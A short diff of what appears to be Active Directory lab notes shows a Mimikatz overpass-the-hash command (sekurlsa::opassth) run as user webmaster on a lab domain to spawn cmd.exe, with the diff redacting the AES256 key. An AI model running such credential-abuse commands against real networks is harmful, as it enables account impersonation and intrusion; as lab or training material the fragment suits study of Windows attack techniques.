@@ -50,7 +50,7 @@ C:\Windows\system32>C:\AD\Tools\mimikatz.exe
  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
-mimikatz # sekurlsa::opassth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:cmd.exe
+mimikatz # sekurlsa::opassth /user:webmaster /domain:us.techcorp.local /aes256:. /run:cmd.exe
 user    : webmaster
 domain  : us.techcorp.local
 program : cmd.exe
